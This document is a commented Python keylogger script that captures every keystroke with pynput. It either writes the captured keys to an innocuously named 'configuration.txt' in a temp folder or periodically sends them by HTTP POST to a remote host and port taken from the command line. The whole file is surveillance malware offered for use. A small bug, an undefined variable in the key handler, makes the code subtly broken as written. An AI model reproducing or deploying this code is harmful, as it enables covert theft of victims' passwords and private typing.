from pynput import keyboard #monitor keyboard interruptions
import threading #threads for timing the send/write functions
import requests #http request for remote execution
import time, sys, os, tempfile #time capture, read arguments, read/write directories and get temp folder path

class Keylogger:

    #constructor 
    def __init__(self, send_interval, exec_mode, host, port):
        self.log = '' #variable to save every key interruption until reset
        self.send_interval = send_interval #time interval to send/write log
        self.exec_mode = exec_mode #execution mode (local or remote)
        self.host = host #host to send the log to (remote execution)
        self.port = port #port to send the log to (remote execution)

    # from pynput documentation:
    # The key parameter passed to callbacks is 
    #     a pynput.keyboard.Key for special keys, 
    #     a pynput.keyboard.KeyCode for normal alphanumeric keys, 
    #     or just None for unknown keys.

    #function that gets executed everytime a keyboard interruption is captured    
    def on_press(self, key):
        try:
            #try to get the char value asuming is a KeyCode (normal alphanumeric keys)
            #it will throw an AttributeError if its not, meaning is an special key (like space, enter, shift...)
            #save the value of the pressed key to a temporary variable "k"
            k = key.char
        except AttributeError:

            #if this code gets executed, it means the interruption is for an special or unknown key
            #if the interruption is for the space key, save ' ' instead of 'space' 
            if key == key.space:
                k = ' '

            #if its different from space, convert the special key to string (it will have the format "Key.[pressed_key]")
            #and split by the dot (.), it will return an array like this: split_result = ['Key', 'pressed_key'].
            #take the 2nd index of the array, convert to uppercase and surround in brackets to have: [PRESSED_KEY].
            #so if enter is pressed for example, instead of saving 'Key.enter', we'll save '[ENTER]' to the temporary variable "k"
            else:
                k = '[' + str(key).split('.')[1].upper() + ']'
        
        #append the value of "k" to the log        
        self.log = self.log + string

    #method for local execution, creates a file and continuosly appends captured data.
    def write_log(self):

        #Get the path to temp folder of OS and append directory \MYK
        path = tempfile.gettempdir()+'\\MYK\\'
        #check whether the specified path exists or not
        exists = os.path.exists(path)
        if not exists:
          #create if it doesn't exists
          os.makedirs(path)
        
        #if log is not empty, append the current date and the captured interruptions to a file called configuration.txt
        if self.log != '':
            with open(path+'configuration.txt', 'a+') as f:
                f.write(time.asctime()+":\n")
                f.write(self.log+"\n\n")

            #empty log afterwards
            self.log = ''
        
        #start time to run this function again in the interval specified in the send_interval attribute
        timer = threading.Timer(self.send_interval, self.write_log)
        timer.start()


    #method for remote execution, captures are send in the body of an http post request            
    def send_log(self):
        #if log is not empty, create the post request to the host and port specified in the attributes and 
        #send log data in the body of the request
        if self.log != '':
            try:
                req = requests.post('http://{host}:{port}/'.format(host = self.host, port = self.port), data = (time.asctime()+":\n"+self.log))
            except:
                raise Exception("Could not connect to the remote server! Halting remote execution.")

            #empty log afterwards
            self.log = ''

        #start time to run this function again in the interval specified in the send_interval attribute
        timer = threading.Timer(self.send_interval, self.send_log)
        timer.start()

    #method to start the keylogger
    def start(self):

        #start the keyboard.Listener (which is a threading.Thread) passing the callback function to be executed
        #when a keyboard interruption gets captured
        with keyboard.Listener(on_press=self.on_press) as listener:

            #if the execution is --remote, call the send_log function to start the timer
            #if the execution is --local, call the write_log function to start the timer
            if self.exec_mode == '--remote':     
                self.send_log()
            elif self.exec_mode == '--local':
                self.write_log()

            #start the thread
            listener.join()

#function to print the usage of this script
def print_usage():
    print('USAGE:\n\tkeylogger.py [send_interval] [ --local | --remote [host] [port] ]\n\n')

try:

    #read the arguments to know the send_interval and execution mode
    send_interval = int(sys.argv[1])
    exec_mode = sys.argv[2]
    if exec_mode == '--local':
        host = ''
        port = ''
    elif exec_mode == '--remote':
        host = sys.argv[3]
        port = int(sys.argv[4])
    else:
        raise ValueError

    #construct keylogger instance based on arguments
    klog = Keylogger(send_interval, exec_mode, host, port)
    #call the start function to start the keylogger
    klog.start()

#if an error ocurred while reading the arguments, execute below
except (ValueError, IndexError):
    print('ERROR: Bad arguments.\n')
    print_usage()
#if an error ocurred in the execution, execute below
except Exception as e:
    print("ERROR: exception ocurred on execution, details: "+str(e)+"\n")

    
